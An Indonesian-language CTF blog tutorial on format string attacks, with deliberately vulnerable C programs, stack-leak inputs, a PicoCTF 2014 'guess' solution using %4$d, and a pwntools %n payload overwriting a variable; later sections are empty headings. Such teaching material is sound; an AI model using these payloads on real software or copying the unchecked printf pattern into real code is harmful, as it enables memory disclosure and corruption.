@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>Format String Attack :: /home/rhama/ — Personal Blog</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Format String Attack Format String Attack adalah vulnerability yang memanfaatkan format specifiers yang dimana dapat dimanfaatkan untuk melakukan read/write pada memory. Fungsi printf family seperti (printf, fprintf, dprintf, sprintf, snprintf, vprintf, vfprintf, vdprintf, vsprintf, vsnprintf) tergolong kedalam fungsi yang vulnerable Format String Attack.
+Format String Attack terjadi karena inputan user langsung di render oleh fungsi yang menggunakan prinsip Format Specifier (seperti printf family) sehingga nilai-nilai yang berada pada memory dapat diread/write."/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="rhamaa.github.io/post/2018-05-30-format-string-attack/" />
+
+
+
+
+
+<link rel="stylesheet" href="rhamaa.github.io/assets/style.css">
+
+
+<link rel="stylesheet" href="rhamaa.github.io/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="rhamaa.github.io/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="rhamaa.github.io/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Format String Attack"/>
+<meta name="twitter:description" content="Format String Attack Format String Attack adalah vulnerability yang memanfaatkan format specifiers yang dimana dapat dimanfaatkan untuk melakukan read/write pada memory. Fungsi printf family seperti (printf, fprintf, dprintf, sprintf, snprintf, vprintf, vfprintf, vdprintf, vsprintf, vsnprintf) tergolong kedalam fungsi yang vulnerable Format String Attack.
+Format String Attack terjadi karena inputan user langsung di render oleh fungsi yang menggunakan prinsip Format Specifier (seperti printf family) sehingga nilai-nilai yang berada pada memory dapat diread/write."/>
+
+
+
+<meta property="og:title" content="Format String Attack" />
+<meta property="og:description" content="Format String Attack Format String Attack adalah vulnerability yang memanfaatkan format specifiers yang dimana dapat dimanfaatkan untuk melakukan read/write pada memory. Fungsi printf family seperti (printf, fprintf, dprintf, sprintf, snprintf, vprintf, vfprintf, vdprintf, vsprintf, vsnprintf) tergolong kedalam fungsi yang vulnerable Format String Attack.
+Format String Attack terjadi karena inputan user langsung di render oleh fungsi yang menggunakan prinsip Format Specifier (seperti printf family) sehingga nilai-nilai yang berada pada memory dapat diread/write." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="rhamaa.github.io/post/2018-05-30-format-string-attack/" />
+<meta property="og:site_name" content="/home/rhama/" />
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">ls</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="rhamaa.github.io/about">About</a></li>
+        
+      
+        
+          <li><a href="rhamaa.github.io/showcase">Showcase</a></li>
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="rhamaa.github.io/about">About</a></li>
+      
+    
+      
+        <li><a href="rhamaa.github.io/showcase">Showcase</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title"><a href="rhamaa.github.io/post/2018-05-30-format-string-attack/">Format String Attack</a></h1>
+    <div class="post-meta">
+      
+
+      <span class="post-author">— Written by CTF.Ninja</span>
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          #<a href="rhamaa.github.io/tags/format_string_attack/">Format_String_Attack</a>&nbsp;
+        
+          #<a href="rhamaa.github.io/tags/pwn/">Pwn</a>&nbsp;
+        
+      </span>
+    
+
+    
+      
+        <img src="/assets/images/CTF.png" class="post-cover" />
+      
+    
+
+    <div class="post-content">
+      <h1 id="format-string-attack">Format String Attack</h1>
+<p>Format String Attack adalah vulnerability yang memanfaatkan <strong>format specifiers</strong> yang dimana dapat dimanfaatkan untuk melakukan read/write pada memory. Fungsi <strong>printf family</strong> seperti <strong>(printf, fprintf, dprintf, sprintf, snprintf, vprintf, vfprintf, vdprintf, vsprintf, vsnprintf)</strong> tergolong kedalam fungsi yang vulnerable <strong>Format String Attack</strong>.</p>
+<p><strong>Format String Attack</strong> terjadi karena inputan user langsung di <strong>render</strong> oleh fungsi yang menggunakan prinsip <strong>Format Specifier</strong> (seperti printf family) sehingga nilai-nilai yang berada pada memory dapat diread/write.</p>
+<h2 id="format-specifier">Format Specifier</h2>
+<table>
+<thead>
+<tr>
+<th>Format Specifier</th>
+<th>Output</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>%d, %i</td>
+<td>Decimal</td>
+</tr>
+<tr>
+<td>%u</td>
+<td>Unsigned Decimal</td>
+</tr>
+<tr>
+<td>%x</td>
+<td>Hex Decimal</td>
+</tr>
+<tr>
+<td>%c</td>
+<td>Character</td>
+</tr>
+<tr>
+<td>%p</td>
+<td>Pointer</td>
+</tr>
+<tr>
+<td>%n</td>
+<td>Writes the number of characters into a pointer</td>
+</tr>
+</tbody>
+</table>
+<p>Example :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>){
+    <span style="color:#66d9ef">int</span> x <span style="color:#f92672">=</span> <span style="color:#ae81ff">1337</span>;
+    <span style="color:#66d9ef">char</span> name[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Aiden Pearce&#34;</span>;
+    printf(<span style="color:#e6db74">&#34;Decimal num : %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, x);
+    printf(<span style="color:#e6db74">&#34;Hex num : %x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, x);
+    printf(<span style="color:#e6db74">&#34;Name : %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, name);
+    printf(<span style="color:#e6db74">&#34;Address of name : %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, name);
+    printf(<span style="color:#e6db74">&#34;Address of x : %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">&amp;</span>x);
+
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><pre><code>$ gcc format.c -o format
+$ ./format
+Decimal num : 1337
+Hex num : 539
+Name : Aiden Pearce
+Address of name : 0x7ffdb0eaca90
+Address of x : 0x7ffdb0eaca8c
+</code></pre><p>%[parameter][flags][width][.precision][length]specifier</p>
+<p><img src="/img/format_string/0/n_args.png" alt=""></p>
+<pre><code>$ ./format_1
+Output : 2018 1337
+</code></pre><h2 id="read-value-from-memory">Read value from memory</h2>
+<p>Untuk melakukan <code>read</code> data dari memory sebenarnya cukup mudah, yaitu hanya dengan menggunakan salah satu <code>format specifier</code> yang disebutkan sebelumnya. Apabila data yang ingin kita <code>read</code> output nya dalam bentuk <code>Hex decimal</code> maka gunakan format specifier <code>%x</code>, apabila ingin output nya berupa <code>Decimal</code> maka gunakan <code>%d</code> dan <code>%p</code> untuk output dalam bentuk <strong>address memory</strong>.</p>
+<p>Contoh program yang vulnerability</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[]){
+
+    printf(argv[<span style="color:#ae81ff">1</span>]);
+
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><pre><code>$ ./read_memory_1 &quot;%p %p %p %p %p %p&quot;
+(nil) 0xf7db4637 0x2 0xffb7b3c4 0xffb7b3d0 (nil)
+</code></pre><p>nilai 0x00 atau <code>NULL byte</code> akan direpresentasikan sebagai <code>(nil)</code>.</p>
+<p>Perlu diketahui, bahwa data yang di read diatas merupakan nilai-nilai berada dalam <code>Stack Frame</code> (dari fungsi yang dipanggil saat ini yaitu fungsi <code>main()</code>) tepat sebelum fungsi <code>printf</code> dipanggil. <code>Stack Frame</code> sendiri bisa dibilang adalah &ldquo;area bermain&rdquo; suatu fungsi, yaitu untuk menyimpan <code>Local Variable</code> dan <code>Return Address</code> ataupun nilai-nilai lain yang dibutuhkan oleh fungsi yang bersangkutan.</p>
+<p>Agar lebih memahami nilai-nilai yang terleak bisa didebug menggunakan <code>gdb</code>, dan agar mengetahui dengan tepat nilai-nilai yang akan terleak, saya memasang <strong>breakpoint</strong> tepat sebelum fungsi <code>printf()</code> dieksekusi.</p>
+<p><img src="/img/format_string/1/stack_layout_printf.png" alt="Note: *Nilai stack saat proses debug dengan gdb berbeda karena ASLR nya enable"></p>
+<p>Dari keadaan <code>Stack</code> diatas dapat diketahui bahwa nilai yang terleak adalah</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">0x0 - <span style="color:#f92672">(</span>Argument pertama<span style="color:#f92672">)</span>
+0xf7e0f647 - <span style="color:#f92672">(</span>Argument kedua<span style="color:#f92672">)</span>
+0x2 - <span style="color:#f92672">(</span>Argument ketiga<span style="color:#f92672">)</span>
+0xffffc3f4 - <span style="color:#f92672">(</span>Argument keempat<span style="color:#f92672">)</span>
+0xffffc400 - <span style="color:#f92672">(</span>Argument kelima<span style="color:#f92672">)</span>
+0x0 - <span style="color:#f92672">(</span>Argument keenam<span style="color:#f92672">)</span>
+</code></pre></div><p>Dengan menggunakan cara debugging seperti diatas, kita dapat mengetahui dengan pasti nilai yang akan terleak, sehingga tidak perlu lagi melakukan <code>trial and error</code> dengan cara memasukan <strong>format specifier</strong> yang banyak untuk mengetahui nilai-nilai yang terleak.</p>
+<h3 id="study-kasus--picoctf-2014---guess">Study Kasus : PicoCTF 2014 - Guess</h3>
+<p>Pada soal <code>PicoCTF 2014</code> terdapat soal bernama <code>guess</code> yang vulnerable format string attack, berikut source nya :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;learning_format_string_attack&#34;</span>;
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(){
+    <span style="color:#66d9ef">int</span> secret, guess;
+    <span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">32</span>];
+    <span style="color:#66d9ef">long</span> seed;
+
+    FILE <span style="color:#f92672">*</span>f <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;/dev/urandom&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>);
+    fread(<span style="color:#f92672">&amp;</span>secret, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">int</span>), <span style="color:#ae81ff">1</span>, f);
+    fclose(f);
+
+    printf(<span style="color:#e6db74">&#34;Hello! What is your name?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+    fgets(name, <span style="color:#66d9ef">sizeof</span>(name), stdin);
+
+    printf(<span style="color:#e6db74">&#34;Welcome to the guessing game, &#34;</span>);
+    printf(name);
+    printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">I generated a random 32-bit number.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">You have a 1 in 2^32 chance of guessing it. Good luck.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+
+    printf(<span style="color:#e6db74">&#34;What is your guess?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+    scanf(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>guess);
+
+    <span style="color:#66d9ef">if</span>(guess <span style="color:#f92672">==</span> secret){
+        printf(<span style="color:#e6db74">&#34;Wow! You guessed it!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+        printf(<span style="color:#e6db74">&#34;Your flag is: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, flag);
+    }<span style="color:#66d9ef">else</span>{
+        printf(<span style="color:#e6db74">&#34;Hah! I knew you wouldn&#39;t get it.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+    }
+}
+</code></pre></div><p>Dapat diketahui bahwa program tersebut mengambil 32 bit (4 bytes) random byte dari <code>/dev/urandom</code> dan menyimpan nya ke variable <code>secret</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">    FILE <span style="color:#f92672">*</span>f <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;/dev/urandom&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>);
+    fread(<span style="color:#f92672">&amp;</span>secret, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">int</span>), <span style="color:#ae81ff">1</span>, f);
+    fclose(f);
+</code></pre></div><p>Tentu saja kesempatan untuk menebak 32 bit (4 bytes) adalah 1 dari 2^32 (4.294.967.296) kesempatan. Tapi program tersebut vulnerable format string attack, sehingga sangat memungkinkan untuk meleak nilai dari <code>secret</code> sebelum <code>secret</code> akan dibandingkan dengan inputkan kita yang disimpan di variable <code>guess</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">fgets(name, <span style="color:#66d9ef">sizeof</span>(name), stdin);
+printf(<span style="color:#e6db74">&#34;Welcome to the guessing game, &#34;</span>);
+printf(name); <span style="color:#75715e">// here is the bug
+</span></code></pre></div><pre><code>$ ./guess
+Hello! What is your name?
+%d %d %d %d %d %d %d
+Welcome to the guessing game, 32 -134797920 149999624 973938019 -134799360 149999624 622879781
+
+I generated a random 32-bit number.
+You have a 1 in 2^32 chance of guessing it. Good luck.
+What is your guess?
+1234
+Hah! I knew you wouldn't get it.
+</code></pre><p>Dengan menginputkan banyak format specifier sembarangan memang akan membuat kita bisa meleak nilai yang ada di <code>Stack</code>, tetapi kita tidak tahu dengan pasti yang mana yang merupakan nilai dari variable <code>secret</code>. Oleh karena itu bisa dilakukan debugging menggunakan <code>gdb</code> seperti cara yang sebelumnya.</p>
+<p>Saya akan memasang 2 <strong>Breakpoint</strong></p>
+<ol>
+<li>Setelah fungsi fread dieksekusi yang men-set nilai variable secret yaitu pada address 0x0804862f</li>
+<li>Tepat sebelum printf (yang vulnerable format string) dieksekusi untuk mengetahui layout stack nya</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gdb-peda$ b *0x804862f
+Breakpoint <span style="color:#ae81ff">1</span> at 0x804862f
+gdb-peda$ b *0x0804867e
+Breakpoint <span style="color:#ae81ff">2</span> at 0x804867e
+</code></pre></div><p><img src="/img/format_string/1/leak_secret.png" alt=""></p>
+<p><img src="/img/format_string/1/random_value_examine.png" alt=""></p>
+<p>Nilai variable <code>secret</code> pada saat proses debugging adalah <code>0x5baecfd5</code>.</p>
+<p>Perhatikan <code>layout stack</code> sebelum <code>printf</code> dieksekusi, dapat diketahui bahwa nilai variable <code>secret</code> berada di argument ke-4.
+<img src="/img/format_string/1/printf_secret_layout.png" alt=""></p>
+<p>Karena nilai <code>secret</code> diketahui berada di posisi ke 4, berarti tinggal menggunakan format <code>%4$d</code> untuk mendapatkan nilai <code>secret</code> yang valid.</p>
+<pre><code>$ ./guess
+Hello! What is your name?
+%4$d
+Welcome to the guessing game, 1289956455
+
+I generated a random 32-bit number.
+You have a 1 in 2^32 chance of guessing it. Good luck.
+What is your guess?
+1289956455
+Wow! You guessed it!
+Your flag is: learning_format_string_attack
+</code></pre><h2 id="write-value-into-memory-address">Write value into memory address</h2>
+<h3 id="n-format-specifier"><code>%n</code> Format Specifier</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">int</span> x;
+printf(<span style="color:#e6db74">&#34;HELLO WORLD%n&#34;</span>, <span style="color:#f92672">&amp;</span>x);
+printf(<span style="color:#e6db74">&#34;x = %d&#34;</span>, x);
+</code></pre></div><pre><code>$ ./write
+HELLO WORLDx = 11
+</code></pre><p><code>x</code> akan bernilai 11. Karena fungsi dari <code>%n</code> akan menuliskan jumlah/panjang karakter <code>Output</code> dari <code>printf()</code> dalam contoh program diatas, string <code>HELLO WORLD</code> adalah outputnya, dimana jumlah/panjang karakter nya adalah 11 karakter, lalu 11 yang marupakan jumlah karakternya akan disimpan di variable <code>x</code>.</p>
+<p>Hal seperti itu sama saja seperti <code>x = len(&quot;HELLO WORLD&quot;)</code> apabila di python.</p>
+<p><img src="/img/format_string/2/n_11.png" alt=""></p>
+<p>Perlu diperhatikan, fungsi dari <code>%n</code> memang akan menusliskan jumlah/panjang karakter <code>Output</code> tetapi itu bergantung pada dimana posisi <code>%n</code> dilatakan.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">int</span> x;
+printf(<span style="color:#e6db74">&#34;HELLO%n WORLD&#34;</span>, <span style="color:#f92672">&amp;</span>x);
+printf(<span style="color:#e6db74">&#34;x = %d&#34;</span>, x);
+</code></pre></div><p>Apabila program diatas dijalankan, Outputnya adalah string <code>HELLO WORLD</code>, tetapi <code>%n</code> diletakan tepat setelah string <code>HELLO</code> oleh karena itu nilai dari variable <code>x</code> adalah 5 karena panjang string <code>HELLO</code> = 5.</p>
+<pre><code>$ ./write
+HELLO WORLDx = 5
+</code></pre><p><img src="/img/format_string/2/n_5.png" alt=""></p>
+<h3 id="study-kasus--overwrite-variable">Study Kasus : Overwrite Variable</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">char</span> secret <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;A&#39;</span>;
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv){
+
+    printf(argv[<span style="color:#ae81ff">1</span>]);
+    fflush(stdout);
+    <span style="color:#66d9ef">if</span> (secret <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;Z&#39;</span>){
+        puts(<span style="color:#e6db74">&#34;Good, You Modified secret variable&#34;</span>);
+    }<span style="color:#66d9ef">else</span>{
+        puts(<span style="color:#e6db74">&#34;You Are Not 1337&#34;</span>);
+    }
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><pre><code>$ ./format &quot;%p %p %p %p %p %p %p %p&quot;
+0xfffe0504 0xfffe0510 0x80484c1 0xf7f8d3dc 0xfffe0470 (nil) 0xf7df3637 0xf7f8d000You Are Not 1337
+</code></pre><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> p32
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">padding</span>(payload):
+    <span style="color:#66d9ef">return</span> payload <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;X&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">32</span><span style="color:#f92672">-</span>len(payload))
+
+<span style="color:#75715e"># nm format | grep &#34;secret&#34;</span>
+secret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0804a024</span>
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+payload <span style="color:#f92672">+=</span> p32(secret)
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%86c</span><span style="color:#e6db74">%260$n&#34;</span>
+
+<span style="color:#66d9ef">print</span> padding(payload)
+
+</code></pre></div><h2 id="leak-stack-canary">Leak Stack Canary</h2>
+<h2 id="leak-libc-address">Leak libc address</h2>
+<h2 id="leak-pie-base-address">Leak PIE Base Address</h2>
+<h2 id="got-hijacking">GOT hijacking</h2>
+<h2 id="tips-for-64-bit-binary">Tips For 64 Bit Binary</h2>
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="rhamaa.github.io/post/2018-02-25-easyivctf-2018/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">EasyCTF IV 2018 - Reversing</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="rhamaa.github.io/post/2017-11-20-hxpctf-2017-web150/">
+                  <span class="button__text">hxp CTF 2017 - cloud18 (web 150)</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+
+    
+      
+        
+
+      
+    
+
+    </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">ls</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span>© 2020 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span>Theme created by <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="rhamaa.github.io/assets/main.js"></script>
+<script src="rhamaa.github.io/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
